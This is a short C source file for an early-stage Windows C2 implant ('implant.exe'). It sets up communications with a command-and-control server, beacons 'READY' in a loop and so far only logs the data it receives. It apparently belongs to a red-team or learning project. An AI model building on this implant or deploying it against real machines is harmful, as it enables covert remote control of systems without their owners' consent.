#include "c2_comms.h"



// Global heap handle
HANDLE heap;

// Present working directory, globally accessible
char pwd[MAX_PATH + 1] = {0};
 


// cl implant.c  /Fe:implant.exe /DDEBUG /DEBUG
// cl implant.c /Fe:implant.exe
int main() {
    int status = 0;
    unsigned int len = 0;
    char buffer[1024] = {0};


    // Basic setup
    status = SetupComms();
    if (status < 0) {
        c2_log("[!] ERROR in comms setup\n");
        TearDownComms();
        return -1;
    }
    c2_log("[+] Comms setup sucessfully\n");
    heap = GetProcessHeap();


    
    while (1) {
        // Recv data TODO: handle timeouts in c2_comm.h with loop
        c2_send("READY", 5); // we need an initial send so we can get a corresponding response
        int n = c2_recv(buffer, 1024);
        if (n <= 0) {
            c2_log("[!] Didn't receive any data!\n");
            continue;
        }

        // Just print data for now
        c2_log("DATA: %s\n", buffer);
        

        // Clear buffer
        memset(buffer, 0, 1024);
    }
    





    TearDownComms();
    return 0;
}
